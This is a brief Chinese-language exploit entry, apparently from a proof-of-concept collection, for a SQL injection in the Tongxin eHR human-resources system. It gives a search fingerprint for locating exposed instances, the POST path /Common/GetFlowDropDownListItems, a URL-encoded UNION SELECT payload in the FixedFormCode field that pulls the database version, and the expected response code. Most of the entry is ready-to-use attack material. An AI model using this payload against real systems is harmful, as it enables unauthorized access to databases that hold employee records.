# 同鑫eHR人力资源管理系统GetFlowDropDownListItemsSQL注入漏洞

同鑫eHR人力资源管理系统GetFlowDropDownListItems ｜ SQL注入 ｜ —
- **指纹**：`body="/TX.CDN"`
- **请求**：`POST /Common/GetFlowDropDownListItems HTTP/1.1`

**Payload**
```
FixedFormCode=1%27%20UNION%20ALL%20SELECT%20NULL%2C@@VERSION--
```
- **响应特征**：200